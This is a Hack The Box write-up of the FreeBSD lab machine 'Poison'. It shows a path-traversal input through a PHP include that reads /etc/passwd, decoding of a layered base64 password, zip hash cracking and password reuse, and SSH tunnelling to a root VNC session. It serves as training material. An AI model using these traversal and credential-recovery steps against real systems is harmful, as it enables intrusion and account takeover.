---
machine: Poison
platform: Hack The Box
category: Linux
os: Other
difficulty: Medium
points: 30
tags: [lfi, log-poisoning, vnc, ssh-tunneling, encrypted-archive]
date: 2026-02-08
status: retired
summary: A FreeBSD web host exercising local file inclusion and path traversal against a script-testing endpoint, layered encoding of a recovered secret, password reuse against an encrypted archive, and pivoting through SSH-tunneled internal services to reach a locally-bound remote desktop. Tests source-disclosure enumeration, credential recovery, and port-forwarding tradecraft.
---

## Enumeration

nmapscan:

```bash
──(kali㉿kali)-[~/htb/poison]
└─$ nmap -sCV -p- 10.129.1.254 -oN nmapscanb                        
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-19 07:58 -0400
Nmap scan report for 10.129.1.254
Host is up (0.036s latency).
Not shown: 65517 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp    open     http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
1727/tcp  filtered winddx
4509/tcp  filtered unknown
7536/tcp  filtered unknown
8591/tcp  filtered unknown
14558/tcp filtered unknown
15804/tcp filtered unknown
16632/tcp filtered unknown
20886/tcp filtered unknown
21439/tcp filtered unknown
36095/tcp filtered unknown
51470/tcp filtered unknown
51523/tcp filtered unknown
52163/tcp filtered unknown
55101/tcp filtered unknown
56957/tcp filtered unknown
62171/tcp filtered unknown
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 425.86 seconds
```

On the webapp we have an input field which seems to be used for testing php scripts:

```text
# Temporary website to test local .php scripts.

Sites to be tested: ini.php, info.php, listfiles.php, phpinfo.php
Scriptname: <input field>
```

When I input `ls` it errors:

```text
**Warning**: include(ls): failed to open stream: No such file or directory in **/usr/local/www/apache24/data/browse.php** on line **2**  
  
**Warning**: include(): Failed opening 'ls' for inclusion (include_path='.:/usr/local/www/apache24/data') in **/usr/local/www/apache24/data/browse.php** on line **2**
```

This immediately makes me suspect that its trying to open the input as a filename so I attempt a path traversal `../../../../../../etc/passwd` and we succeed!

```text
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $ # root:*:0:0:Charlie &:/root:/bin/csh toor:*:0:0:Bourne-again Superuser:/root: daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin operator:*:2:5:System &:/:/usr/sbin/nologin bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin news:*:8:8:News Subsystem:/:/usr/sbin/nologin man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin _pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin _dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin _ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin _tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin charix:*:1001:1001:charix:/home/charix:/bin/csh
```

We see a user `charix` with `csh` shell access and a couple root users:

```text
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
```

When we try the intended test files in the submit box we see this in listfiles.php

```text
Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt )
```

Given that we know these other php files are in the same directory maybe pwdbackup.txt would also be in there.

`phpinfo.php` shows us information about the php as well:

```text
|   |   |
|---|---|
||FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64|

|   |   |
|---|---|
||Apache/2.4.29 (FreeBSD) PHP/5.6.32|
```

Upon running `pwdbackup.txt` we get:

```text
This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=
```

After spamming base64 decode in cyberchef we finally decode the password to be `Charix!2#4%6&8(0` for cred pair `charix:Charix!2#4%6&8(0`

## Foothold

We can ssh into charix with these credentials:

```bash
──(kali㉿kali)-[~/htb/poison]
└─$ ssh charix@10.129.1.254                        
The authenticity of host '10.129.1.254 (10.129.1.254)' can't be established.
ED25519 key fingerprint is: SHA256:ai75ITo2ASaXyYZVscbEWVbDkh/ev+ClcQsgC6xmlrA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.1.254' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html

(charix@10.129.1.254) Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4

charix@Poison:~ % whoami
charix
charix@Poison:~ % ls
secret.zip      user.txt
charix@Poison:~ % cat user.txt

```

I get the user flag and scp down the .zip file

```bash
┌──(kali㉿kali)-[~/htb/poison]
└─$ scp charix@10.129.1.254:/home/charix/secret.zip .
```

Attempting to unzip the file we see that its password locked:

```bash
──(kali㉿kali)-[~/htb/poison]
└─$ unzip secret.zip 
Archive:  secret.zip
[secret.zip] secret password: 
password incorrect--reenter:    
```

This should be easy to bypass.  Canonically we simply zip2john it and then crack it with rockyou.txt

```bash
┌──(kali㉿kali)-[~/htb/poison]
└─$ zip2john secret.zip > johnzip
ver 2.0 secret.zip/secret PKZIP Encr: cmplen=20, decmplen=8, crc=77537827 ts=9827 cs=7753 type=0

┌──(kali㉿kali)-[~/htb/poison]
└─$ cat johnzip                                                                        
secret.zip/secret:$pkzip$1*1*2*0*14*8*77537827*0*24*0*14*7753*8061b9caf8436874ad47a9481863b54443379d4c*$/pkzip$:secret:secret.zip::secret.zip
         
┌──(kali㉿kali)-[~/htb/poison]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt johnzip 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2026-05-19 08:56) 0g/s 14343Kp/s 14343Kc/s 14343KC/s !LUVDKR!..*7¡Vamos!
Session completed.
```

John failed, if the answers not in rockyou.txt this is most likely not the intended solution.  I probably jumped the gun, lets try box specific password guesses like our known password from `Charix!2#4%6&8(0`.  We see that this does extract the zip file.  This makes sense considering it is a file in his directory so reusing his password is feasible.

This is the contents of secret:

```bash
┌──(kali㉿kali)-[~/htb/poison]
└─$ cat secret                   
��[|Ֆz!                                                                                                                                                                         
┌──(kali㉿kali)-[~/htb/poison]
└─$ file secret                                                                                                                                  
secret: Non-ISO extended-ASCII text, with no line terminators
```

This seems to be a dead end for now so we can move on to enumerating for other files and our internal environment.

## Privilege Escalation

#### Linux Checking Internal Services and Ports

```bash
charix@Poison:~ % sockstat -l
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS      
www      httpd      796   3  tcp6   *:80                  *:*
www      httpd      796   4  tcp4   *:80                  *:*
root     sendmail   721   3  tcp4   127.0.0.1:25          *:*
www      httpd      720   3  tcp6   *:80                  *:*
www      httpd      720   4  tcp4   *:80                  *:*
www      httpd      719   3  tcp6   *:80                  *:*
www      httpd      719   4  tcp4   *:80                  *:*
www      httpd      718   3  tcp6   *:80                  *:*
www      httpd      718   4  tcp4   *:80                  *:*
www      httpd      717   3  tcp6   *:80                  *:*
www      httpd      717   4  tcp4   *:80                  *:*
www      httpd      716   3  tcp6   *:80                  *:*
www      httpd      716   4  tcp4   *:80                  *:*
root     httpd      704   3  tcp6   *:80                  *:*
root     httpd      704   4  tcp4   *:80                  *:*
root     sshd       699   3  tcp6   *:22                  *:*
root     sshd       699   4  tcp4   *:22                  *:*
root     Xvnc       608   0  stream /tmp/.X11-unix/X1
root     Xvnc       608   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       608   3  tcp4   127.0.0.1:5801        *:*
root     syslogd    469   4  dgram  /var/run/log
root     syslogd    469   5  dgram  /var/run/logpriv
root     syslogd    469   6  udp6   *:514                 *:*
root     syslogd    469   7  udp4   *:514                 *:*
root     devd       396   4  stream /var/run/devd.pipe
root     devd       396   5  seqpac /var/run/devd.seqpacket.pipe
```

It seems like we have some local services running on 5901,5801, and 25

For ease of access we can port forward these to our local machines
`ssh -L 5901:127.0.0.1:5901 -L 5801:127.0.0.1:5801 -L 2525:127.0.0.1:25 charix@10.129.1.254`

We see vnc is running on 5901 and 5801 and 25 is usually for SMTP

#### Viewing VNC connections with vncviewer

We can access this with `vncviewer` which comes preinstalled on kali. We can access the vnc service by entering: `127.0.0.1:5901` as that is where we portforwarded it. It asks for a password but our charix password fails, when we read the manual we see we can specify a password file with option `-passwd`. So we can auth with the secret we recovered earlier and `vncviewer -passwd secret`

With that we get root vnc access and can retrieve the root flag.
